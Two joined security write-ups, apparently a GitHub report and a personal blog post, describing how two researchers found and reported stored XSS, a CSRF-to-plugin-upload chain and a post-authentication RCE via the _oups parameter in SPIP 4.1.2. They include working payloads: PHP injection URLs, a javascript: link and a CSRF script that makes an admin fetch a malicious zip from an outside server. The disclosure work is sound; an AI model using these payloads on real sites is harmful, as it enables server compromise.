=== Content from github.com_a684043b_20250115_090148.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FAbyss-W4tcher%2Fab4yss-wr4iteups%2Fblob%2Fffa980faa9e3598d49d6fb7def4f7a67cfb5f427%2FSPIP%2520-%2520Pentest%2FSPIP%25204.1.2%2FSPIP_4.1.2_AUTH_RCE%2FSPIP_4.1.2_AUTH_RCE_Abyss_Watcher_12_07_22.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FAbyss-W4tcher%2Fab4yss-wr4iteups%2Fblob%2Fffa980faa9e3598d49d6fb7def4f7a67cfb5f427%2FSPIP%2520-%2520Pentest%2FSPIP%25204.1.2%2FSPIP_4.1.2_AUTH_RCE%2FSPIP_4.1.2_AUTH_RCE_Abyss_Watcher_12_07_22.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Abyss-W4tcher%2Fab4yss-wr4iteups)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Abyss-W4tcher](/Abyss-W4tcher)
/
**[ab4yss-wr4iteups](/Abyss-W4tcher/ab4yss-wr4iteups)**
Public

* [Notifications](/login?return_to=%2FAbyss-W4tcher%2Fab4yss-wr4iteups) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2FAbyss-W4tcher%2Fab4yss-wr4iteups)
* [Star
   2](/login?return_to=%2FAbyss-W4tcher%2Fab4yss-wr4iteups)

* [Code](/Abyss-W4tcher/ab4yss-wr4iteups)
* [Issues
  0](/Abyss-W4tcher/ab4yss-wr4iteups/issues)
* [Pull requests
  0](/Abyss-W4tcher/ab4yss-wr4iteups/pulls)
* [Actions](/Abyss-W4tcher/ab4yss-wr4iteups/actions)
* [Projects
  0](/Abyss-W4tcher/ab4yss-wr4iteups/projects)
* [Security](/Abyss-W4tcher/ab4yss-wr4iteups/security)
* [Insights](/Abyss-W4tcher/ab4yss-wr4iteups/pulse)

Additional navigation options

* [Code](/Abyss-W4tcher/ab4yss-wr4iteups)
* [Issues](/Abyss-W4tcher/ab4yss-wr4iteups/issues)
* [Pull requests](/Abyss-W4tcher/ab4yss-wr4iteups/pulls)
* [Actions](/Abyss-W4tcher/ab4yss-wr4iteups/actions)
* [Projects](/Abyss-W4tcher/ab4yss-wr4iteups/projects)
* [Security](/Abyss-W4tcher/ab4yss-wr4iteups/security)
* [Insights](/Abyss-W4tcher/ab4yss-wr4iteups/pulse)

## Files

 ffa980f
## Breadcrumbs

1. [ab4yss-wr4iteups](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427)
2. /[SPIP - Pentest](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest)
3. /[SPIP 4.1.2](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2)
4. /[SPIP\_4.1.2\_AUTH\_RCE](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/SPIP_4.1.2_AUTH_RCE)
/
# SPIP\_4.1.2\_AUTH\_RCE\_Abyss\_Watcher\_12\_07\_22.md

Copy path Blame  Blame
## Latest commit

## History

[History](/Abyss-W4tcher/ab4yss-wr4iteups/commits/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/SPIP_4.1.2_AUTH_RCE/SPIP_4.1.2_AUTH_RCE_Abyss_Watcher_12_07_22.md)executable file·213 lines (129 loc) · 9.76 KB ffa980f
## Breadcrumbs

1. [ab4yss-wr4iteups](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427)
2. /[SPIP - Pentest](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest)
3. /[SPIP 4.1.2](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2)
4. /[SPIP\_4.1.2\_AUTH\_RCE](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/SPIP_4.1.2_AUTH_RCE)
/
# SPIP\_4.1.2\_AUTH\_RCE\_Abyss\_Watcher\_12\_07\_22.md

Top
## File metadata and controls

* Preview
* Code
* Blame

executable file·213 lines (129 loc) · 9.76 KB[Raw](https://github.com/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/SPIP_4.1.2_AUTH_RCE/SPIP_4.1.2_AUTH_RCE_Abyss_Watcher_12_07_22.md)
# How a security fix introduced a security issue in SPIP 4.1.2

---

#### Author : Abyss Watcher

---

# Context

SPIP is a free french CMS, developed in PHP. Here is a short resume from their [website](https://www.spip.net/en_rubrique25.html) :

> SPIP is a publishing system for the Internet in which great importance is attached to collaborative working, to multilingual environments, and to simplicity of use for web authors. It is free software, distributed under the GNU/GPL licence. This means that it can be used for any Internet site, whether personal or institutional, non-profit or commercial.

One of their main consumer is [Root Me](https://www.root-me.org), a learning website oriented in cybersecurity.
After Root Me introduced two SPIP related challenges on their platform, I got more familiar with the SPIP core, as I needed to setup a local environment to resolve them.

Two Root Me users discovered some SQLi and RCE on the site [recently](https://www.root-me.org/en/Information/Hacks/) ([real](https://www.root-me.org/real) also found an SQLi but isn't mentioned on the "hacks" page) :

[![](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/5dbc6efe458fabf2981192f240d412f58823443caa1bb7039bc37bc3e86f48a8.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/5dbc6efe458fabf2981192f240d412f58823443caa1bb7039bc37bc3e86f48a8.png)

As I wanted the little medal ~~of honor~~[![](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/d96c965a03e85d319b924e69c9f489745eb14c3eecf1979ad269842afa37ad57.svg)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/d96c965a03e85d319b924e69c9f489745eb14c3eecf1979ad269842afa37ad57.svg) given to Root Me pwners, I started investigating SPIP.

The local test environment was composed of the latest SPIP version (4.1.2 from 20/05/2022), runned by PHP 8.0.0 and MySQL 5.6. "parano" mode activated (anti-XSS).

# Stored XSS (+ CSRF and RCE)

You can find details on this part in the report named "SPIP\_4.1.2\_XSS\_Abyss\_Watcher\_30\_06\_22.pdf"¨(it's in french sorry :)). They were my first discoveries, and already gave me the right to have the holy medal (and my name in the pwners) :

[![picture 3](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/a2a16921932a73e2303756f1da070291054740346985f6b3e8ba2e355905043f.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/a2a16921932a73e2303756f1da070291054740346985f6b3e8ba2e355905043f.png)

> Traduction : "*has identified a stored XSS vulnerability in any rendered field*"

I was happy, but it wasn't **enough**.

# Post-Auth RCE

## privileges needed to exploit

You need to have the "author" role, or be able to see articles in the backend.

## work in pair, maximise your chances

As I am not really a bug bounty guy, I asked [SpawnZii](https://www.root-me.org/SpawnZii) (<http://yeswefiak.fr:1313/>) to join me in my researches. We'll cover more surface and help each other see things that could have been missed.

## check what have already been done

How could I write these lines without mentioning the work done here by Laluka : <https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/>. He basically destroyed the scope, by building tools and manually reviewing everything. He pulled out many vulnerabilities (as mentionned earlier), which where all **ｆｉｘｅｄ** at the time we were doing the bounty. Or maybe not :).

## "on est bon, rien a faire"

After many hours trying to exploit via file upload, dns rebinding etc., I decided to read the Laluka article one more time. I noticed this PHP comment in a SPIP commit, which fixed the RCE :

[![picture 4](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/eeee1b1aa2c2fd34f489212d2b9bab942aa1e79cba9e06c4597f7a5f8187b631.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/eeee1b1aa2c2fd34f489212d2b9bab942aa1e79cba9e06c4597f7a5f8187b631.png)

> Traduction : "**we are good, nothing to do**"

At the instant I saw this text, I knew something was wrong. I felt it in my spine.

## debug, try to understand what is going on

The \_oups parameter allows to cancel an action, like a miss click on "Remove author" from the "edit\_article" page. The previous code can be found in <https://github.com/spip/SPIP/blob/0394b44774555ae8331b6e65e35065dfa0bb41e4/prive/formulaires/editer_liens.php#L130> :

L130 -> 140 (formulaires\_editer\_liens\_charger\_dist) :

```
$oups = _request('_oups') ?? '';
	if ($oups) {
		if (unserialize(base64_decode($oups))) {
			// on est bon, rien a faire
		} elseif (unserialize($oups)) {
			// il faut encoder
			$oups = base64_encode($oups);
		} else {
			$oups = '';
		}
	}
```

We can see that it is checking for the GET parameter "\_oups". Let's add some glorious `print_r`, and try to pass the `if`s :

[![picture 5](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/85612877c76dafcb54cda62cd453bdc5efdb8558960dd998cc6a3837ea3cd91b.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/85612877c76dafcb54cda62cd453bdc5efdb8558960dd998cc6a3837ea3cd91b.png)

Well, it was easy. We just needed to pass a valid PHP object encoded in base64 : `'czoxOiJhIjtpOjE6MDs=' : 's:1:"a";i:1:0;'`.

The value is reflected in an HTML field :

`<input type="hidden" name="_oups" value="czoxOiJhIjtpOjE6MDs=">`

Yup, yup, yup. Wanna XSS ?

[![](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/c746d4efba320c498aa67bdac1d74f1aa1fc22f1f1baea086d913fc263a4be9b.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/c746d4efba320c498aa67bdac1d74f1aa1fc22f1f1baea086d913fc263a4be9b.png)

## quotes everywhere, xss everywhere

Let's inject random quotes and angle brackets `_oups=czoxOiJhIjtpOjE6MDs='">` :

[![picture 12](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/9d24128350cc6d7957e3c75afd050493e5c1a54ed5d151e9f74a4593c5e2197a.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/9d24128350cc6d7957e3c75afd050493e5c1a54ed5d151e9f74a4593c5e2197a.png)

[![picture 13](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/257127c4c4ab9a3e4aaa6c4dfc6dc56d76f056fdb5709ebb668e5cffaf7f90bf.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/257127c4c4ab9a3e4aaa6c4dfc6dc56d76f056fdb5709ebb668e5cffaf7f90bf.png)

[![](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/b20123d86d2c1428de66b36d119f808526ff80bc1865475610a1191daaf9d1ae.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/b20123d86d2c1428de66b36d119f808526ff80bc1865475610a1191daaf9d1ae.png)

This does not look good, noting that at this point, I didn't even checked what was the rest of the code. The only observation I could make was that the unserialize function only checked if "\_oups" started with a valid base\_64 object.

Does it mean that everything after the b64 is processed without restiction ?

## investigate a bit

The code here is the end of the `formulaires_editer_liens_charger_dist` function. Let's check with `print_r` what it looks like :

```
$valeurs = [
		'id' => "$table_source-$objet-$id_objet-$objet_lien", // identifiant unique pour les id du form
		'_vue_liee' => $skel_vue,
		'_vue_ajout' => $skel_ajout,
		'_objet_lien' => $objet_lien,
		'id_lien_ajoute' => _request('id_lien_ajoute'),
		'objet' => $objet,
		'id_objet' => $id_objet,
		'objet_source' => $objet_source,
		'table_source' => $table_source,
		'recherche' => '',
		'visible' => 0,
		'ajouter_lien' => '',
		'supprimer_lien' => '',
		'qualifier_lien' => '',
		'ordonner_lien' => '',
		'desordonner_liens' => '',
		'_roles' => $roles, # description des roles
		'_oups' => $oups,
		'editable' => $editable,
	];

	// les options non definies dans $valeurs sont passees telles quelles au formulaire html
	$valeurs = array_merge($options, $valeurs);
	print_r($valeurs);
	return $valeurs;
```

Try to render an HTML tag `<b>BOLD ?</b>`:

[![picture 14](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/572d0439615d9f2152b807155a879889f1b880057be33f4ad09ff1d09a5c034c.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/572d0439615d9f2152b807155a879889f1b880057be33f4ad09ff1d09a5c034c.png)

We can see that the "\_oups" value holds our valid base64 object, and everything that comes after. I don't know SPIP enough to explain why this is rendered like that, but my guess is that the "templates" interprets it as if it was valid code passed from the server.

Soooooo ?

## \_oupsed

Retranscription (screenshot from the conversation with SpawnZii) :

> Dude, I think I found a reflected XSS with this payload :

[![picture 17](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/b57caf30d2ff829ef42b3d6be145d083cd252603f9b47d3617ae10f7c225b20d.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/b57caf30d2ff829ef42b3d6be145d083cd252603f9b47d3617ae10f7c225b20d.png)

*45 seconds later* :

[![picture 18](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/973be6b2653cc3b01e7cf3612356719304de456c2aba68c72efcad66210502a7.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/973be6b2653cc3b01e7cf3612356719304de456c2aba68c72efcad66210502a7.png)

Well, well, well, what could have happened between those two messages ?

Hint :

[![](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/49dd8834df7e677b12ff2505ad2a9b50ebbccb5feda0e8145469e178a44adbb6.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/49dd8834df7e677b12ff2505ad2a9b50ebbccb5feda0e8145469e178a44adbb6.png)

Answer (`_oups=czoxOiJhIjtpOjE6MDs=%27"><?php%20echo(%27RCE%27)?>`) :

[![picture 21](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/268dc8e7967375a7ec418d84cba4f56b5405477f8758cb073c6cb9d9bcb30dd9.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/268dc8e7967375a7ec418d84cba4f56b5405477f8758cb073c6cb9d9bcb30dd9.png)

The php tags are gone, and we can see the letters "R","C","E" kindly appearing on our screen :).

What is happening :

```
if (_request('annuler_oups') and $oups = _request('_oups') and $oups = base64_decode($oups) and $oups = unserialize($oups))
```

So, it first checks for a valid base64\_decode, which is true. Then for a valid object, which is also true (the object instantiates a string "a" of length 1) :

[![picture 40](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/test_b64decode_unserialize.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/test_b64decode_unserialize.png)

It considers the user input as valid, and sends it to further processing (dynamic eval engine of SPIP) which renders our code.

We now have the ability to execute arbitrary code on the server, with any author account. A first approach could be to dump the `phpinfo()` to check the disabled functions, then build payloads to exfiltrate files, secrets (e.g. : SQL creds in `config/connect.php`), try to privesc etc.

After this discovery, we decided to create POC's for exploit automation. It is joined in this folder, under the name "SPIP\_4.1.2\_AUTH\_RCE\_POC.py". We did not pushed it really far, just an interactive webshell on terminal, with basic error handling.

## be good, report to SPIP

We decided to report the vulnerability to SPIP, because we had no interest into exploiting or selling it. [g0uZ](https://www.root-me.org/g0uZ), foundator of Root Me, is also in charge of the security in SPIP core. They were both quickly capable to fix the issue.

# Conclusion

It was a great experience to work in team with SpawnZii, and being able to make Root Me and SPIP a little more secure is great. We managed to generate two POC, one led to CSRF/RCE via a stored XSS, the other to RCE via logic errors.

There are certainly still bugs present, but we don't think continuing pentesting it for now.
I hope that you had pleasure to read these lines, and that it motivated into finding exploits (in a white hat way). Also, don't forget to double check your security fixes :).

[![](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/2d9a35b486096e2b7914d46b2abf9feb28145298306e19b63ed60569104e7499.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.2/images/2d9a35b486096e2b7914d46b2abf9feb28145298306e19b63ed60569104e7499.png)

## Fix :

* <https://git.spip.net/spip/spip/pulls/5253>

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from spawnzii.github.io_755167dd_20250115_090149.html ===

[$ /home/spz](/)

* [About](/about/)
* [Posts](/posts/)
* en

5 minutes

# [How we have pwned Root-Me in 2022](https://SpawnZii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/)

## Introduction

Hello,
I’m currently a student at ESNA and I’m passionate about web application security. This article describes the discovery of several critical vulnerabilities in the SPIP CMS and [Root-Me](https://www.root-me.org/).

With a friend (cc [Abyss Watcher](https://github.com/Abyss-W4tcher)) we decided to search for vulnerabilities on the SPIP/Root-Me. From the first days, we managed to find some bugs, XSS, CSRF and later we will discover a RCE.

## Environment

Of course we did not our research directly on root me. So we set up a local spip environment.

* SPIP version 4.1.2 <https://files.spip.net/spip/archives/spip-v4.1.2.zip>
* [Laluka’s](https://twitter.com/TheLaluka) [docker-compose file](https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/):

```
version: '3.5'

services:
  db:
    image: mysql:5.6
    command: --default-authentication-plugin=mysql_native_password
    environment:
        - MYSQL_ROOT_PASSWORD=root
    ports:
        - 3306:3306

  adminer:
    image: adminer
    ports:
        - 81:8080

  spip:
    image: php:8.0
    ports:
        - 80:80
    volumes:
        - ./spip:/spip
    working_dir: /spip
    entrypoint: ["bash", "-c", "apt update && apt install -y default-mysql-client && docker-php-ext-install mysqli && apt install -y libzip-dev zip && docker-php-ext-install zip && php -S 0.0.0.0:80"]

```

* We have also activated the “[parano](https://www.spip.net/fr_article4642.html)” mode, this mode allows to disable the execution of javascript in the articles.

```
// sécuriser les scripts javascript en mode parano
$GLOBALS['filtrer_javascript'] = -1;

```
## # Bug 1 - A simple XSS to start

After some research I managed to identify a trivial stored XSS. An author can add hyperlink with the following payload `javascript:alert(document.domain)`, So when the user clicks on the link, the javascript will be executed.

![form](/posts/rmrce/pldsimplexss.png)

It’s possible to trigger the xss at several places, on the public part of the site.

![form](/posts/rmrce/publictriggerxss.png)

And on the administration interface.

![form](/posts/rmrce/triggerxss.png)

### XSS to CSRF to RCE ?

Now that we can run javascript several scenarios are possible via.

* Create a CSRF to take over the users’ accounts.
* Create a CSRF to elevate our privileges.
* Create a CSRF to upload a malicious plugin

You guessed it, I chose the last option, for that we will look at a function of spip allowing an administrator to upload a plugin.

![form](/posts/rmrce/manage.png)

This function allows an administrator to upload a plugin in zip format from a remote server, the plugin will be unzip and stored at `/plugins/auto/`.
By analyzing the upload request, we notice that two tokens are passed as parameters, fortunately for us, they do not change between two requests

![form](/posts/rmrce/token.png)

It’s time to build our payload !

### Evil plugin setup.

The function to download a plugin waits for a zip file, so we must create our plugins on our remote server.

```
┌──(spawnzii㉿spawnzii)-[/tmp/websrv]
└─$ echo '<?php system("id");?>' > spzrce.php

┌──(spawnzii㉿spawnzii)-[/tmp/websrv]
└─$ zip spzrce.zip spzrce.php
  adding: spzrce.php (stored 0%)

```

Our plugin is ready, we can place it in a listening web server.

### CSRF payload construction.

On the first part we will make a request to get the tokens.

```
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://localhost/ecrire/?exec=charger_plugin');
xhr.responseType = 'document';
xhr.send();
xhr.onreadystatechange = function () {
if (xhr.readyState == 4) {
  token_sign = xhr.response.getElementsByName('formulaire_action_sign')[1].value;
  token_arg = xhr.response.getElementsByName('formulaire_action_args')[1].value;
  token_sign = encodeURIComponent(token_sign);
  token_arg = encodeURIComponent(token_arg);
  }
}

```

Now that we have our two tokens, we can build the second request to upload a plugin.

```
function csrf_rce() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://localhost/ecrire/?exec=charger_plugin');
    xhr.responseType = 'document';
    xhr.send();

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4) {
            token_sign = xhr.response.getElementsByName('formulaire_action_sign')[1].value;
            token_arg = xhr.response.getElementsByName('formulaire_action_args')[1].value;
            token_sign = encodeURIComponent(token_sign);
            token_arg = encodeURIComponent(token_arg);
            var xhrr=new XMLHttpRequest();
            xhrr.open('POST', 'http://localhost/ecrire/?exec=charger_plugin', true);
            xhrr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhrr.onload = function () {
                console.log(this.responseText);
            }
            xhrr.send(`var_ajax=form&exec=charger_plugin&formulaire_action=charger_plugin_archive&formulaire_action_args=${token_arg}&formulaire_action_sign=${token}&archive=http%3A%2F%2Fyourserver%2Fspzrce.zip&destination=`);
        }
    };
}

csrf_rce();

```

We just have to encode our payload in base64 and paste it on the hyperlink.

![form](/posts/rmrce/pldcsrf.png)

Now that our payload is ready, all we have to do is wait for an administrator to click on the link to download the plugin.

![form](/posts/rmrce/o.gif#center)

![form](/posts/rmrce/apresclique.png)

We can go to our plugin to see the result.

![form](/posts/rmrce/poc.png)

## # Bug 2 - “On est bon, rien a faire” sounds like RCE

After a few xss found, we wanted to think bigger and we gave ourselves the objective to find a RCE.

A few days later Abyss watcher had the idea to watch the fix of an old vulnerability (cc [Laluka](https://twitter.com/TheLaluka)).

![form](/posts/rmrce/patch.png)

### What happens in the patch ?

Before the patch the `_oups` parameter was passed directly to the `$valeurs` array.
Now `_oups` expects a serialized object encoded in base64.

![form](/posts/rmrce/oupscommit.png)

To debug more simply we have added a `print_r` of the variable `$valeurs`.
This allows us to see the result of our payload directly on the page.

### It’s time for a bypass

Now what happens if we put a simple string like **http://localhost/ecrire/?exec=article&id\_article=1&\_oups=notanobject** on `_oups` parameter ?

![form](/posts/rmrce/nv.png)

Nothing, `_oups` is empty.

But now try to inject serialized object, like : `TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9`.

![form](/posts/rmrce/v.png)

The string is reflected several times in the source code.

![form](/posts/rmrce/inj.png)

We can try to inject with **`http://localhost/ecrire/?exec=article&id_article=1&_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'"<h1>inject here</h1>`**

![form](/posts/rmrce/h1.png)

Damnnn, nice we have html/XSS injection.
You know what that means ???

Are you remember [the Laluka’s RCE ?](https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/)
And if we try to reproduce the same thing. **`http://localhost/ecrire/?exec=article&id_article=1&_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'"<?php system('id');?>`**.

![form](/posts/rmrce/rcepoc.png)

Here we go again …

## Small explanations

![form](/posts/rmrce/mm.jpg)

SPIP uses skeletons, a kind of html template that is used to formalise the rendering of a page. The problem here is that once the skeleton is filled in, it is passed to a function that evaluates the page ([**evaluer\_page.php**](https://github.com/spip/SPIP/blob/master/ecrire/public/evaluer_page.php)).

![form](/posts/rmrce/eval.png)

So as we inject into the skeleton (**[editer\_lien.html](https://github.com/spip/SPIP/blob/master/prive/formulaires/editer_liens.html)**), once passed into the function **evaluate\_page.php** the php is interpreted.

## Patch

This is how oops is managed after the patch.
